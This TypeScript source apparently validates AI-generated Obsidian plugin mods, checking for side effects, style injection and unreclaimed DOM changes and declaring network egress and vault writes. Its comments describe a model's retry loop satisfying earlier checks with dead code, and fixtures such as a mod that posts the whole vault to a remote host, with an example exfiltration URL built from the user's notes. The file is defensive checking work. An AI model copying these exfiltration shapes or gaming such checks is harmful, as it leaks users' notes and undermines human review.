 * `ok` is exactly "no finding has severity `error`" — a warning is reported and shipped, and an
 * **effect is not a finding at all**, so it can never block. The report is a superset of
 * {@link ValidationReport}, so every existing caller keeps working and a caller that knows about the
 * effects axis reads `effects`.
 */
export function validateSource(source: string, options: ValidateOptions = {}): EffectsReport {
  const { findings, effects } = validateAll(source, options);
  return { ok: !findings.some((f) => f.severity === 'error'), findings, effects };
}

/**
 * The one finding `validateSource` cannot produce, because it never sees `stylesCss` — that lives
 * beside `main.js`, not inside it. A css-mode plane-E artifact that ships no stylesheet at all (or
 * an empty/whitespace one) is the exact silent no-op L1 exists to kill: the mod installs, reports
 * itself `applied`, and nothing was ever styled, because the rules the model was asked to put in
 * `stylesCss` never left its structured answer. `generate.ts` calls this alongside
 * `validateSource`/`screenStylesheet` and merges the result into the same report.
 *
 * `dom`-mode plane E and every other plane are exempt: a `dom`-mode mod styles nothing by
 * definition, and a css-*capable* mod on another plane may simply have nothing to say in CSS.
 */
export function checkCssModeStylesheet(
  plane: ReachPlaneId,
  mode: 'css' | 'dom' | undefined,
  stylesCss: string | undefined,
): ValidationFinding[] {
  if (plane !== 'E' || mode !== 'css') return [];
  if (typeof stylesCss === 'string' && stylesCss.trim() !== '') return [];
  return [
    {
      rule: 'css-mod-without-stylesheet',
      severity: 'error',
      message:
        'a plane-E css-mode mod shipped no stylesCss (or an empty one) — installing it would report ' +
        '"applied" while styling nothing. Put every rule the request needs in `stylesCss`.',
      line: 1,
      column: 1,
      file: 'styles.css',
    },
  ];
}

/* ────────────────────────────────────────────────────────────────────────────
 * Structural rules that read the Program body directly
 * ──────────────────────────────────────────────────────────────────────────── */

type Add = (rule: RuleId, message: string, node: PositionedNode, severity?: ValidationSeverity) => void;

/** A statement that may appear at module scope. Nothing here *runs*; all work happens in `onload()`. */
function checkTopLevel(program: acorn.Program, add: Add): void {
  for (const node of program.body) {
    if (
      node.type === 'ImportDeclaration' ||
      node.type === 'ExportDefaultDeclaration' ||
      node.type === 'ClassDeclaration' ||
      node.type === 'FunctionDeclaration' ||
      node.type === 'EmptyStatement'
    ) {
      continue;
    }
    // esbuild's ts→esm transform rewrites `export default class X` into `class X {}` plus
    // `export { X as default }`, so a bare ExportNamedDeclaration is normal output, not a smell.
    if (node.type === 'ExportNamedDeclaration') {
      const decl = node.declaration;
      if (decl === null || decl === undefined) continue;
      if (decl.type === 'ClassDeclaration' || decl.type === 'FunctionDeclaration') continue;
      if (decl.type === 'VariableDeclaration' && isStaticDeclaration(decl)) continue;
      add(
        'no-top-level-side-effects',
        `exported top-level ${decl.type} runs at module load — declare it and do the work in onload()`,
        node,
      );
      continue;
    }
    if (node.type === 'VariableDeclaration' && isStaticDeclaration(node)) continue;
    add(
      'no-top-level-side-effects',
      `top-level ${node.type} — a patch may only declare at module scope (imports, const with ` +
        'a static initialiser, functions, and the default-exported class). All work belongs in onload()',
      node,
    );
  }
}

/**
 * Everything else that runs before, or outside, `onload()`.
 *
 * `checkTopLevel` walks `program.body` and only `program.body`, which made three positions invisible
 * — a **`static {}` block** (runs at module load, before `onload`, outside any `Component`), a
 * **class field initialiser** (runs at construction), and a **parameter default** (a statement
 * position nobody reads as one). Each was reproduced with `activeDocument.body.dataset.pwned = "1"`
 * and each returned zero findings.
 */
function checkConstructionTime(program: acorn.Program, add: Add): void {
  walk.simple(program, {
    StaticBlock(node) {
      for (const stmt of node.body) {
        if (stmt.type === 'FunctionDeclaration' || stmt.type === 'ClassDeclaration') continue;
        if (stmt.type === 'EmptyStatement') continue;
        if (stmt.type === 'VariableDeclaration' && isStaticDeclaration(stmt)) continue;
        add(
          'no-top-level-side-effects',
          `a class \`static { }\` block runs at module load — before onload(), outside any Component, ` +
            'and untouched by disabling the mod. All work belongs in onload()',
          stmt,
        );
      }
    },
    PropertyDefinition(node) {
      const value = node.value;
      if (value === null || value === undefined) return;
      if (isStaticInitialiser(value)) return;
      add(
        'no-top-level-side-effects',
        `a class field initialiser runs at construction, outside onload() and outside the reclaim ` +
          'contract — declare the field and assign it in onload()',
        value,
      );
    },
    AssignmentPattern(node) {
      // A default only runs when the function is called, so a *call* in one is ordinary. A
      // *mutation* in one is a statement hidden in a position nobody reads as one.
      let offender: acorn.AnyNode | null = null;
      walk.full(node.right, (child) => {
        if (offender !== null) return;
        if (child.type === 'AssignmentExpression' || child.type === 'UpdateExpression') offender = child;
      });
      if (offender !== null) {
        add(
          'no-top-level-side-effects',
          'a parameter default mutates something — a default is an expression position, not a ' +
            'statement position, and work hidden there runs outside onload()',
          offender,
        );
      }
    },
  });
}

/** `const` only, and only with an initialiser that cannot run anything. */
function isStaticDeclaration(decl: acorn.VariableDeclaration): boolean {
  if (decl.kind !== 'const') return false;
  return decl.declarations.every((d) => {
    const init = d.init;
    if (init === null || init === undefined) return false;
    return isStaticInitialiser(init);
  });
}

/** The initialiser half of {@link isStaticDeclaration}, shared with the construction-time check. */
function isStaticInitialiser(init: acorn.AnyNode): boolean {
  switch (init.type) {
    case 'Literal':
    case 'ArrowFunctionExpression':
    case 'FunctionExpression':
      return true;
    case 'TemplateLiteral':
      return init.expressions.length === 0;
    case 'ArrayExpression':
    case 'ObjectExpression':
      // Shallow on purpose: a nested call would be a top-level side effect and is caught by the
      // walk's own rules (no-bare-global, no-eval) wherever it actually is.
      return true;
    case 'UnaryExpression':
      return init.argument.type === 'Literal';
    case 'Identifier':
      // Reading a binding cannot run anything. Rejecting `const LABEL = TARGET_LABEL;` was a false
      // rejection, and a false rejection burns a generation on the retry loop.
      return true;
    case 'BinaryExpression':
      // `const KEY = "add" + "EventListener";` is inert — and it is exactly the shape `consts`
      // folding exists to resolve, so rejecting the declaration while folding the value was
      // self-contradictory. Composition only: a call or a member read on either side is still work.
      return isStaticInitialiser(init.left as acorn.AnyNode) && isStaticInitialiser(init.right);
    case 'CallExpression': {
      // `const LIMITS = Object.freeze({ max: 10 })` is inert, and it is a very plausible model
      // output. Rejecting it was a false rejection: `Object.freeze`/`seal`/`create` on a static
      // argument run no user code and reach nothing. Every other call is still work.
      const callee = unwrapChain(init.callee);
      if (callee.type !== 'MemberExpression') return false;
      const object = unwrapChain(callee.object);
      if (object.type !== 'Identifier' || object.name !== 'Object') return false;
      const method = propertyName(callee);
      if (method === null || !INERT_OBJECT_CALLS.has(method)) return false;
      return init.arguments.every((a) => a.type !== 'SpreadElement' && isStaticInitialiser(a));
    }
    default:
      return false;
  }
}

function checkImports(program: acorn.Program, allowed: readonly string[], add: Add): void {
  for (const node of program.body) {
    let sourceNode: acorn.Literal | null | undefined;
    if (node.type === 'ImportDeclaration') sourceNode = node.source;
    else if (node.type === 'ExportNamedDeclaration' || node.type === 'ExportAllDeclaration') {
      sourceNode = node.source;
    }
    if (sourceNode === null || sourceNode === undefined) continue;
    const spec = typeof sourceNode.value === 'string' ? sourceNode.value : '';
    if (allowed.includes(spec)) continue;
    const nodePrefixed = spec.startsWith('node:');
    add(
      'import-not-allowed',
      nodePrefixed
        ? `imports "${spec}" — a \`node:\`-prefixed specifier is not covered by esbuild's \`external\` ` +
            'list and fails the build outright, and Obsidian mobile has no node at all. Only ' +
            `${allowed.map((a) => `"${a}"`).join(' and ')} may be imported`
        : `imports "${spec}" — only ${allowed.map((a) => `"${a}"`).join(' and ')} may be imported`,
      node,
    );
  }
}

/** `createElement`/`createEl`'s tag name is argument 0; `createElementNS`'s is argument 1 (the namespace is 0). */
const STYLE_TAG_ARG_INDEX: ReadonlyMap<string, number> = new Map([
  ['createElement', 0],
  ['createEl', 0],
  ['createElementNS', 1],
]);

/**
 * `<style>` element injection, in every shape measured in the two real generated mods that carried
 * the 2026-09-02 bug (see PLAN.md's "Where this actually is"): `createEl("style", …)`,
 * `document.createElement("style")` paired with `activeDocument…appendChild(style)`,
 * `.style.cssText = …`, `insertAdjacentHTML` carrying a `<style` tag, `CSSStyleSheet` /
 * `adoptedStyleSheets`, and a `<style` tag built as a string. All of them are the same defect: code
 * that writes a stylesheet into whichever document happens to be `activeDocument` when `onload()`
 * runs, instead of `stylesCss`, which Obsidian applies to **every** window — Settings included,
 * which it opens as a separate window — the moment the mod is enabled, and removes on disable.
 *
 * Pattern-matched on syntax alone, not on the provenance lattice the rest of this file uses.
 * `must-be-reclaimed` already asks whether an *inserted* node's removal is registered, and a
 * `<style>` element whose teardown is correct still passes that rule — correctly, for the DOM
 * mods it is aimed at. This rule is narrower and asks a different question: should a mod be
 * writing a stylesheet from JavaScript at all, reclaimed or not. Plane E's answer is no, `stylesCss`
 * exists precisely so the answer can be no; every other plane's answer is "prefer not to," because
 * a mod that patches behaviour and also wants to style something has the same `stylesCss` on offer.
 */
function checkStyleInjection(
  program: acorn.Program,
  plane: ReachPlaneId | undefined,
  consts: ReadonlyMap<string, string>,
  add: Add,
): void {
  const severity: ValidationSeverity = plane === 'E' ? 'error' : 'warning';
  const remedy =
    'ship the rule in `stylesCss` instead — Obsidian applies styles.css to every window, including ' +
    'Settings (which it opens as a separate window), and removes it again on disable. A <style> ' +
    'element written from onload() only ever reaches whichever window happened to be active when ' +
    'this mod loaded.';

  // One finding per node, however many of the checks below independently notice it.
  const flagged = new Set<acorn.AnyNode>();
  const flag = (node: acorn.AnyNode, message: string): void => {
    if (flagged.has(node)) return;
    flagged.add(node);
    add('inject-stylesheet', message, node, severity);
  };

  const isStyleCreationCall = (node: acorn.AnyNode): boolean => {
    const inner = unwrapChain(node);
    if (inner.type !== 'CallExpression') return false;
    const name = calleeName(inner.callee, consts);
    const tagArg = name === null ? undefined : STYLE_TAG_ARG_INDEX.get(name);
    if (tagArg === undefined) return false;
    const tag = inner.arguments[tagArg];
    // `staticStringValue` folds a const binding or `"sty" + "le"` concatenation the same way the
    // rest of this file's name-based rules do — a bare `.type === 'Literal'` check here would be
    // exactly the "two-token evasion" `staticStringValue`'s own doc comment warns about.
    if (tag === undefined) return false;
    const tagValue = staticStringValue(tag, consts);
    return tagValue !== null && /^style$/i.test(tagValue);
  };

  // A string containing a literal `<style` tag, wherever it is built — a template literal or a
  // plain string. Both were reproduced ferrying a whole `<style>…</style>` block into
  // `insertAdjacentHTML` and into `innerHTML` on 2026-08-31's adversarial rounds.
  const hasStyleTagText = (text: string): boolean => /<style[\s>]/i.test(text);

  // The identifiers bound to a <style> element this file built, so `activeDocument.head.append
  // Child(style)` is caught even though the creation and the insertion are different statements.
  const styleTagNames = new Set<string>();
  walk.simple(program, {
    VariableDeclarator(node) {
      if (node.id.type === 'Identifier' && node.init !== null && node.init !== undefined && isStyleCreationCall(node.init)) {
        styleTagNames.add(node.id.name);
      }
    },
    AssignmentExpression(node) {
      if (node.left.type === 'Identifier' && isStyleCreationCall(node.right)) {
        styleTagNames.add(node.left.name);
      }
    },
  });

  walk.simple(program, {
    CallExpression(node) {
      if (isStyleCreationCall(node)) {
        flag(node, `creates a <style> element from JavaScript — ${remedy}`);
      }

      const name = calleeName(node.callee, consts);
      if (name !== null && INSERT_METHODS.has(name)) {
        for (const arg of node.arguments) {
          if (arg.type === 'SpreadElement') continue;
          const named = arg.type === 'Identifier' && styleTagNames.has(arg.name);
          if (!named && !isStyleCreationCall(arg)) continue;
          flag(node, `inserts a <style> element into the document — ${remedy}`);
        }
      }

      if (name === 'insertAdjacentHTML') {
        for (const arg of node.arguments) {
          const html = staticStringValue(arg, consts);
          if (html !== null && hasStyleTagText(html)) {
            flag(node, `writes a <style> tag through insertAdjacentHTML — ${remedy}`);
          }
        }
      }

      // `el.setAttribute("style", …)` / the Obsidian `setAttr` alias — the inline-style path left
      // open once `el.style.foo = …` is blocked by `no-host-assignment`: the exact remaining way to
      // style an element from onload() without building a `<style>` element at all.
      const attrArg = node.arguments[0];
      if ((name === 'setAttribute' || name === 'setAttr') && node.arguments.length >= 2 && attrArg !== undefined) {
        const attr = staticStringValue(attrArg, consts);
        if (attr !== null && attr.toLowerCase() === 'style') {
          flag(node, `sets the inline "style" attribute from JavaScript — ${remedy}`);
        }
      }
    },
    NewExpression(node) {
      if (calleeName(node.callee, consts) === 'CSSStyleSheet') {
        flag(node, `constructs a CSSStyleSheet from JavaScript — ${remedy}`);
      }
    },
    MemberExpression(node) {
      if (propertyName(node, consts) === 'adoptedStyleSheets') {
        flag(node, `reaches for adoptedStyleSheets — ${remedy}`);
      }
    },
    AssignmentExpression(node) {
      // `el.style.cssText = "…"` — a bulk write of raw CSS text into an element's inline style.
      // Matched on the property name alone, not `<expr>.style.cssText`'s exact shape: `const st =
      // el.style; st.cssText = …` reaches the same DOM property through an aliased receiver, and
      // `cssText` is specific enough (CSSStyleDeclaration/CSSStyleSheet) that this doesn't need the
      // `.style.` prefix to stay narrow.
      const left = unwrapChain(node.left);
      if (left.type === 'MemberExpression' && propertyName(left, consts) === 'cssText') {
        flag(node, `writes CSS text through .cssText — ${remedy}`);
      }
      const html = staticStringValue(node.right, consts);
      if (html !== null && hasStyleTagText(html)) {
        flag(node, `assigns a <style> tag built as a string — ${remedy}`);
      }
    },
    TemplateLiteral(node) {
      const text = node.quasis.map((q) => q.value.cooked ?? q.value.raw).join('');
      if (hasStyleTagText(text)) flag(node, `builds a <style> tag as a string — ${remedy}`);
    },
    Literal(node) {
      if (typeof node.value === 'string' && hasStyleTagText(node.value)) {
        flag(node, `builds a <style> tag as a string — ${remedy}`);
      }
    },
  });
}

function checkDefaultExport(program: acorn.Program, model: Analysis, add: Add): void {
  const found: { node: PositionedNode; cls: acorn.Class | null }[] = [];

  for (const node of program.body) {
    if (node.type === 'ExportDefaultDeclaration') {
      const decl = node.declaration;
      const cls =
        decl.type === 'ClassDeclaration' || decl.type === 'ClassExpression' ? decl : null;
      found.push({ node, cls });
      continue;
    }
    if (node.type === 'ExportNamedDeclaration' && (node.source === null || node.source === undefined)) {
      for (const spec of node.specifiers) {
        const exported = spec.exported;
        const name = exported.type === 'Identifier' ? exported.name : String(exported.value);
        if (name !== 'default') continue;
        const local = spec.local;
        const cls = local.type === 'Identifier' ? (model.topLevelClasses.get(local.name) ?? null) : null;
        found.push({ node, cls });
      }
    }
  }

  if (found.length === 0) {
    add(
      'default-export-must-extend-plugin',
      'no default export — a patch is exactly one default-exported class extending Plugin',
      program.body[0] ?? { start: 0 },
    );
    return;
  }
  if (found.length > 1) {
    const extra = found[1];
    if (extra) {
      add(
        'default-export-must-extend-plugin',
        `${found.length} default exports — a patch is exactly one class extending Plugin`,
        extra.node,
      );
    }
  }

  const first = found[0];
  if (!first) return;
  if (first.cls === null) {
    add(
      'default-export-must-extend-plugin',
      'the default export is not a class declaration — it must be a class extending Plugin',
      first.node,
    );
    return;
  }
  const superClass = first.cls.superClass;
  const pluginLocal = model.obsidianImports.get('Plugin');
  if (pluginLocal === undefined) {
    add(
      'default-export-must-extend-plugin',
      'Plugin is not imported from "obsidian", so the default export cannot extend it',
      first.node,
    );
    return;
  }
  if (superClass === null || superClass === undefined || superClass.type !== 'Identifier') {
    add(
      'default-export-must-extend-plugin',
      `the default-exported class must extend \`${pluginLocal}\` (imported from "obsidian")`,
      first.node,
    );
    return;
  }
  if (superClass.name !== pluginLocal) {
    add(
      'default-export-must-extend-plugin',
      `the default-exported class extends \`${superClass.name}\`, not \`${pluginLocal}\` from "obsidian"`,
      superClass,
    );
  }
}

/**
 * The four things the template does that a hand-written patch reliably forgets, each of which is a
 * silent no-op if it is missing.
 *
 * ⚠️ **These used to be token-presence checks over the whole file**, which is exactly what a retry
 * loop optimises against: five lines of dead ceremony satisfied all three while an unguarded
 * `around()` installed on Tasks' `apiV1` getter. The previous pass bound them to the *subject* — the
 * same holder, the same member, the live instance the holder came from — and that closed the
 * ceremony fixture.
 *
 * ⚠️ **This pass binds two of them to their CONSEQUENCE**, because subject-binding stopped one notch
 * short and both gaps were reproduced at zero findings:
 *
 * - `hasAccessorPreflight` was `sawAccessorTest && descriptorCalls.some(bound to holder)`, where
 *   `sawAccessorTest` was a **file-global boolean any `map.get(x)` satisfied**. A mod could take the
 *   descriptor on the right holder for the right member, throw the result away, and pass. It now
 *   requires the descriptor value to *flow into a binding whose `.get`/`.set` is tested*.
 * - `missing-version-gate` was satisfied by a host-rooted `.version` read that was never compared to
 *   anything — and, worse, by one compared only to `null`, which is an existence check and not a
 *   gate. It now requires the version to reach a **range** comparison whose failure path returns.
 *
 * Satisfying the rule and being safe are the same act now, which is the property the correction turn
 * needs.
 */
function checkTemplateContract(program: acorn.Program, model: Analysis, add: Add): void {
  const anchor: PositionedNode = model.firstInstall ?? program.body[0] ?? { start: 0 };

  // ⚠️ These three used to be wrapped in `if (model.firstAround !== null)`. `firstInstall` is the
  // same question asked of *what the mod does* rather than of which function it named, so a patch
  // installed by assignment owes the gate, the pre-flight and the shadow check exactly as an
  // around() does. Proved by a matched pair of complete mods: same damage, same target, only the
  // install spelling different — the around() one was rejected three times over, the other shipped.
  if (model.firstInstall !== null) {
    if (model.firstGateEnd === null || model.firstGateEnd > model.firstInstall.start) {
      add(
        'missing-version-gate',
        'installs a patch without first gating on the target\'s own version — the gate must run ' +
          'before the first around(): requireApiVersion(...) for Obsidian, and the target manifest ' +
          'version (app.plugins.manifests["<id>"].version) for the target, **compared to a bound** ' +
          'and returning when it is out of range. Outside its range the mod installs nothing, ' +
          'reports target-moved, and does not throw. A version token elsewhere in the file ' +
          '(this.manifest.version) is not a gate on the target, and reading the target version and ' +
          'only checking it against null is an existence check, not a gate',
        anchor,
      );
    }

    if (!model.hasAccessorPreflight) {
      add(
        'accessor-target',
        'installs a patch without an accessor pre-flight on the member being patched — around() ' +
          'reads a property and writes it back, so a getter-only member (Tasks apiV1, QuickAdd api) ' +
          'is silently not patched. Take Object.getOwnPropertyDescriptor(<the same holder passed to ' +
          'around()>, <the member in the around() spec>), **test the result for .get / .set**, and ' +
          'refuse when it has either. A descriptor taken on some other object does not answer the ' +
          'question, and a descriptor taken and discarded does not ask it',
        anchor,
      );
    }

    if (model.patchesPrototype && !model.hasBoundShadowCheck) {
      add(
        'bound-method-target',
        'patches a prototype without asking the live instance whether it shadows the member with its ' +
          'own bound copy — a method captured with .bind(this) at construction is off the prototype ' +
          'call path, so the patch installs and does nothing. Call ' +
          'Object.prototype.hasOwnProperty.call(<the instance the holder came from>, <the member>) ' +
          'and refuse when it is true. Asking any other object does not answer the question',
        anchor,
      );
    }
  }

  if (!model.hasProbe) {
    add(
      'missing-no-effect-probe',
      'no modkitProbe() method that reports anything — a mod must be able to exercise its own ' +
        'patched path and hand back whether it observably applied, so the method must exist AND ' +
        'return a value. An empty probe body satisfied this rule by its name alone until ' +
        '2026-08-31. Silence is the failure mode that poisons everything downstream',
      program.body[0] ?? { start: 0 },
    );
  }
}

/* ────────────────────────────────────────────────────────────────────────────
 * The reclaim contract past timers and listeners
 * ──────────────────────────────────────────────────────────────────────────── */

/**
 * A node put into a tree the mod did not build, or a class added to an element it did not create,
 * must come back out at unload.
 *
 * The exemption is **ownership**, asked of the lattice: `owned` and `static` receivers pass, `host`
 * and `unknown` do not. `activeDocument.createElement("style")` is the mod's own element and needs
 * no registration to be *styled*, only to be *removed*; `this.app.workspace.containerEl` is
 * Obsidian's however the chain is spelled.
 */
function checkDomReclaim(
  node: acorn.CallExpression,
  callee: acorn.AnyNode,
  name: string | null,
  model: Analysis,
  scope: Scope,
  consts: ReadonlyMap<string, string>,
  ancestors: readonly acorn.AnyNode[],
  add: Add,
): void {
  if (callee.type !== 'MemberExpression' || name === null) return;

  const owns = (expr: acorn.AnyNode): boolean => !isHostish(model.provOf(unwrapChain(expr), scope));
  const reclaimed = (expr: acorn.AnyNode | undefined): boolean => model.isReclaimed(expr, scope);

  // ⚠️ `append`, `create` and `remove` are DOM methods **and** Vault methods, and this whole
  // function is about the DOM. `await this.app.vault.append(file, "- done\n")` is an ordinary,
  // correct file write, and it was rejected as "moves a node that belongs to the host out of the
  // tree Obsidian put it in" — a false rejection on a shape a model reaches for constantly, which
  // burns the one correction turn and teaches the retry loop to distrust the rule. A write to the
  // user's files is a real thing to know about, so it is *declared* on the effects axis instead.
  {
    const tail = model.canonicalPath(callee.object, scope)?.split('.').pop() ?? null;
    if (tail !== null && VAULT_RECEIVERS.has(tail)) return;
  }

  if (INSERT_METHODS.has(name)) {
    // ⚠️ The receiver is only half the question. An insert **moves** a node — the DOM gives every
    // node one parent — so `box.appendChild(this.app.workspace.containerEl.firstChild)` takes an
    // element *out of* Obsidian's tree, and the registered `box.remove()` removes the box, not the
    // theft. This branch used to return the moment the receiver was owned, and never looked.
    if (MOVING_INSERTS.has(name)) {
      for (const a of node.arguments) {
        if (a.type === 'SpreadElement') continue;
        // `host` only, not `isHostish`: an `unknown` argument here is far more often a node the mod
        // built through machinery this file cannot follow than a stolen one, and no-host-assignment
        // is where fail-closed on `unknown` belongs.
        if (model.provOf(unwrapChain(a), scope) !== 'host') continue;
        if (reclaimed(a)) continue;
        add(
          'must-be-reclaimed',
          `${name}() moves a node that belongs to the host out of the tree Obsidian put it in — an ` +
            'insert is a removal at the other end, and removing the container the mod created does ' +
            'not put it back. Register the restore, or build a new node instead of moving theirs',
          node,
        );
        return;
      }
    }
    if (owns(callee.object)) return;
    if (node.arguments.some((a) => reclaimed(a))) return;
    add(
      'must-be-reclaimed',
      `${name}() puts a node into something the mod did not create, and nothing removes it at ` +
        'unload — bind the node to a const and register its removal: ' +
        'this.register(() => el.remove()). Anything the mod puts in the DOM also carries ' +
        'data-modkit-mod so the leak is attributable',
      node,
    );
    return;
  }

  // ── Obsidian's createEl/createDiv/createSpan/createSvg are createElement AND appendChild ──
  if (INSERTING_FACTORIES.has(name)) {
    if (owns(callee.object)) return;
    const bound = boundTarget(ancestors);
    if (bound !== null && model.isReclaimed(bound, scope)) return;
    add(
      'must-be-reclaimed',
      `${name}() builds a node **inside** something the mod did not create — Obsidian's ${name}() ` +
        'is createElement() and appendChild() in one call, so this is a permanent write into the ' +
        "user's document. Bind the result and register its removal: const el = " +
        `parent.${name}(...); this.register(() => el.remove()) — or build the element with ` +
        'activeDocument.createElement() and append it yourself, which makes the reclaim visible',
      node,
    );
    return;
  }

  // `el.classList.add("x")` — the mutation is one hop further out than the receiver.
  let receiver: acorn.AnyNode | null = null;
  if (HOST_MUTATIONS.has(name)) receiver = callee.object;
  if (name === 'add' || name === 'toggle') {
    const object = unwrapChain(callee.object);
    if (object.type === 'MemberExpression' && propertyName(object, consts) === 'classList') {
      receiver = object.object;
    }
  }
  if (receiver === null) return;
  if (owns(receiver)) return;
  if (reclaimed(receiver)) return;
  add(
    'must-be-reclaimed',
    `${name}() mutates an element the mod did not create, and nothing undoes it at unload — a class ` +
      'or attribute left on a host element outlives the mod. Register the inverse: ' +
      'this.register(() => el.removeClass("...")), or ship the rule in `stylesCss` instead of ' +
      "touching the host element's own class or style at all — `inject-stylesheet` rejects a " +
      '<style> element built here for the same reason',
    node,
  );
}

/* ────────────────────────────────────────────────────────────────────────────
 * The effects axis
 * ──────────────────────────────────────────────────────────────────────────── */

type Declare = (
  kind: EffectKind,
  call: string,
  subject: string | null,
  summary: string,
  node: PositionedNode,
) => void;

/**
 * Everything the mod does to something that is not itself, and that unloading it does not undo.
 *
 * ⚠️ **This is a declaration pass, not a rule pass, and that is deliberate.** Every fixture it
 * answers validated at *zero findings* — a 176-line mod that rewrote every markdown file in the
 * vault, a mod that trashed files, one that disabled Dataview, one that POSTed the whole vault to a
 * remote endpoint, one that emptied Obsidian's sidebar — because `vault`, `adapter` and
 * `fileManager` appeared nowhere in this file except prose. The reclaim contract had nothing to say
 * about any of them, and it was *right* not to: their patches uninstall perfectly.
 *
 * A ban would be the wrong answer. Writing a file is a thing users ask mods to do, so a ban gets
 * routed around on the correction turn and all it teaches is laundering. What the human needs is to
 * be told, in one line each, before they install.
 */
function collectEffects(program: acorn.Program, model: Analysis, declare: Declare): void {
  const consts = model.constStrings;

  /** The literal a call's first argument names, when it names one — a URL, a path. */
  const literalArg = (node: acorn.CallExpression, index = 0): string | null => {
    const arg = node.arguments[index];
    if (arg === undefined || arg.type === 'SpreadElement') return null;
    const direct = staticStringValue(arg, consts);
    if (direct !== null) return direct;
    // `requestUrl({ url: ENDPOINT, … })` — the request's own shape.
    const inner = unwrapChain(arg);
    if (inner.type === 'ObjectExpression') {
      for (const prop of inner.properties) {
        if (prop.type !== 'Property' || prop.computed) continue;
        const k = prop.key.type === 'Identifier' ? prop.key.name : staticStringValue(prop.key, consts);
        if (k === 'url') return staticStringValue(prop.value, consts);
      }
    }
    return null;
  };

  const withTarget = (summary: string, target: string | null): string =>
    target === null ? summary : `${summary} (${target})`;

  /**
   * Every string fragment statically visible in an expression, concatenated.
   *
   * Deliberately *not* {@link staticStringValue}, which returns `null` the moment an operand is
   * dynamic. `"https://c.example.com/p?v=" + JSON.stringify(notes)` is precisely the shape that
   * matters here, and the half that is a literal is the half that names the destination.
   */
  const visibleText = (node: acorn.AnyNode | null | undefined, depth = 0): string => {
    if (node === null || node === undefined || depth > 8) return '';
    const inner = unwrapChain(node);
    if (inner.type === 'Literal') return typeof inner.value === 'string' ? inner.value : '';
    if (inner.type === 'Identifier') return consts.get(inner.name) ?? '';
    if (inner.type === 'TemplateLiteral') {
      return [
        ...inner.quasis.map((q) => q.value.cooked ?? q.value.raw),
        ...inner.expressions.map((e) => visibleText(e, depth + 1)),
      ].join('');
    }
    if (inner.type === 'BinaryExpression' && inner.operator === '+') {
      return `${visibleText(inner.left, depth + 1)}${visibleText(inner.right, depth + 1)}`;
    }
    if (inner.type === 'ObjectExpression') {
      // `createEl("img", { attr: { src: "https://…" } })` — the URL is two objects deep.
      return inner.properties
        .map((p) => (p.type === 'Property' ? visibleText(p.value, depth + 1) : ''))
        .join(' ');
    }
    return '';
  };

  /** The remote URL a sink is being handed, when one is written out in the source. */
  const remoteUrlIn = (node: acorn.AnyNode | null | undefined): string | null =>
    REMOTE_URL_RE.exec(visibleText(node))?.[0] ?? null;

  const declareRemoteLoad = (url: string, call: string, node: PositionedNode): void => {
    declare(
      'network-egress',
      call,
      url,
      `loads ${url} — the browser sends the request itself, so this leaves the vault without ` +
        'requestUrl(), and unloading the mod does not un-send it',
      node,
    );
  };

  walk.ancestor(program, {
    /**
     * `img.src = "https://…"` — egress through a DOM loader rather than a network API.
     *
     * The element is usually one the mod created, so the reclaim lattice sees an `owned` receiver
     * assigning to its own property and is right to allow it. What was missing is that anyone
     * reading the review screen should be told the vault talks to that host.
     */
    AssignmentExpression(node, _state, ancestors) {
      const left = unwrapChain(node.left);
      if (left.type !== 'MemberExpression') return;
      const prop = propertyName(left, consts);
      if (prop === null || !URL_SINK_PROPERTIES.has(prop)) return;
      const url = remoteUrlIn(node.right);
      if (url === null) return;
      const scope = model.scopeFor(ancestors);
      const path = model.canonicalPath(left, scope) ?? `<element>.${prop}`;
      declareRemoteLoad(url, `${path} = ...`, node);
    },

    CallExpression(node, _state, ancestors) {
      const scope = model.scopeFor(ancestors);
      const callee = unwrapChain(node.callee);
      const name = model.calleeNameAt(node.callee, scope);
      if (name === null) return;

      // ── the same loaders, spelled as a call: setAttribute("src", …), insertRule("…url(…)") ──
      if (URL_SINK_METHODS.has(name)) {
        for (const arg of node.arguments) {
          const url = arg.type === 'SpreadElement' ? null : remoteUrlIn(arg);
          if (url !== null) {
            declareRemoteLoad(url, `${name}(...)`, node);
            break;
          }
        }
      }

      // ── network egress, by whichever door ──
      const net = NETWORK_CALLS.get(name);
      if (net !== undefined) {
        // `send` is only a socket write when the receiver is one; every DOM node has methods with
        // ordinary names and a declaration list nobody trusts is worth nothing.
        const isSocketSend =
          name !== 'send' ||
          (callee.type === 'MemberExpression' && model.ctorOfExpr(callee.object, scope) !== null);
        if (isSocketSend) {
          const url = literalArg(node);
          declare(
            'network-egress',
            `${name}(...)`,
            url,
            withTarget(net, url),
            node,
          );
        }
      }

      if (callee.type !== 'MemberExpression') return;
      const recv = unwrapChain(callee.object);
      const prov = model.provOf(recv, scope);
      const path = model.canonicalPath(recv, scope);
      const tail = path === null ? null : (path.split('.').pop() ?? null);

      // ── the user's files ──
      const vaultWrite = VAULT_WRITE_METHODS.get(name);
      if (vaultWrite !== undefined && tail !== null && VAULT_RECEIVERS.has(tail) && isHostish(prov)) {
        declare('vault-write', `${path}.${name}(...)`, path, vaultWrite, node);
        return;
      }

      // ── the note the user has open ──
      const editorWrite = EDITOR_WRITE_METHODS.get(name);
      // `setValue` is also Obsidian's Setting API, so it counts only on a receiver actually named as
      // an editor; the other four are the Editor interface and nothing else.
      if (editorWrite !== undefined && isHostish(prov) && (name !== 'setValue' || tail === 'editor')) {
        declare('editor-write', `${path ?? '<editor>'}.${name}(...)`, path, editorWrite, node);
        return;
      }

      // ── the TARGET plugin's own persisted state, which outlives uninstalling the mod ──
      const persist = FOREIGN_PERSIST_METHODS.get(name);
      if (persist !== undefined && isHostish(prov)) {
        declare('target-plugin-settings', `${path ?? '<target>'}.${name}(...)`, path, persist, node);
        return;
      }
      if (COLLECTION_WRITERS.has(name) && isHostish(prov) && path !== null && /(^|\.)settings(\.|$)/.test(path)) {
        declare(
          'target-plugin-settings',
          `${path}.${name}(...)`,
          path,
          "changes the target plugin's settings in place — persisted the next time it saves",
          node,
        );
        return;
      }
      // Any other collection the host owns, changed in place. `host` and not `isHostish`, so an
      // ordinary `push` onto something the analysis merely could not follow stays out of the list.
      if ((COLLECTION_WRITERS.has(name) || name === 'clear') && prov === 'host') {
        declare(
          'host-state-mutation',
          `${path ?? '<host collection>'}.${name}(...)`,
          path,
          'changes a collection belonging to Obsidian or to another plugin, in place and for the ' +
            'rest of the session',
          node,
        );
        return;
      }

      // ── another plugin's lifecycle, driven by hand ──
      const lifecycle = FOREIGN_LIFECYCLE_METHODS.get(name);
      // `plugins.plugins.<id>` is how the app graph names *another plugin's live object*, and the
